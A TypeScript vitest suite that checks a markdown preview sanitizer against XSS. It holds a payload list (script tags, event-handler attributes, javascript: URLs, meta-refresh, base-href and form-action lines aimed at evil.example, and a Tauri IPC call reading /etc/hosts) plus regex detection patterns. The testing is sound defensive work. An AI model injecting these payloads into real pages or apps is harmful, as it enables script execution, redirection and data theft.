import { describe, it, expect } from 'vitest';
import { marked } from 'marked';
import { sanitizeUserHtml } from '../sanitizeHtml';

/**
 * End-to-end check of the malicious payloads in docs/security-xss-test.md.
 * Mirrors the preview pipeline (marked → sanitizeUserHtml) and asserts that every
 * script-execution vector is neutralized. CSP is the second line of defense and
 * can't be exercised under vitest; this locks in the sanitization layer.
 */
function render(md: string): string {
  const html = marked(md, { breaks: true, gfm: true, async: false }) as string;
  return sanitizeUserHtml(html);
}

const EXECUTION_ARTIFACTS = [
  /onerror\s*=/i,
  /onload\s*=/i,
  /onclick\s*=/i,
  /ontoggle\s*=/i,
  /onsubmit\s*=/i,
  /javascript:/i,
  /<script/i,
  /<meta/i,        // meta refresh redirect
  /<base/i,        // base-href hijack
  /<iframe/i,
  /<object/i,
  /<embed/i,
];

const PAYLOADS: Record<string, string> = {
  scriptTag: `<script>alert('x'); document.title='XSS-FIRED';</script>`,
  imgOnerror: `<img src="x" onerror="alert('x'); document.title='XSS-FIRED';">`,
  svgOnload: `<svg onload="alert('x')"></svg>`,
  iframeJs: `<iframe src="javascript:alert('x')"></iframe>`,
  mdJsLink: `[no](javascript:alert('x'))`,
  onclickLink: `<a href="#" onclick="alert('x')">click</a>`,
  detailsOntoggle: `<details open ontoggle="alert('x')"><summary>s</summary>b</details>`,
  metaRefresh: `<meta http-equiv="refresh" content="0; url=https://evil.example/">`,
  baseTag: `<base href="https://evil.example/">`,
  formExternal: `<form action="https://evil.example/steal"><input name="s" value="x"></form>`,
  objectJs: `<object data="javascript:alert('x')"></object>`,
  embedJs: `<embed src="javascript:alert('x')">`,
  ipcExfil: `<img src="y" onerror="window.__TAURI_INTERNALS__.invoke('read_file',{path:'/etc/hosts'})">`,
};

describe('XSS fixture payloads are neutralized by the preview pipeline', () => {
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    it(`neutralizes: ${name}`, () => {
      const out = render(payload);
      for (const artifact of EXECUTION_ARTIFACTS) {
        expect(out, `"${artifact}" survived in: ${out}`).not.toMatch(artifact);
      }
    });
  }

  it('preserves legitimate content (defense did not over-strip)', () => {
    const out = render('**bold** and [link](https://example.com) and `code`');
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('<code>code</code>');
  });
});
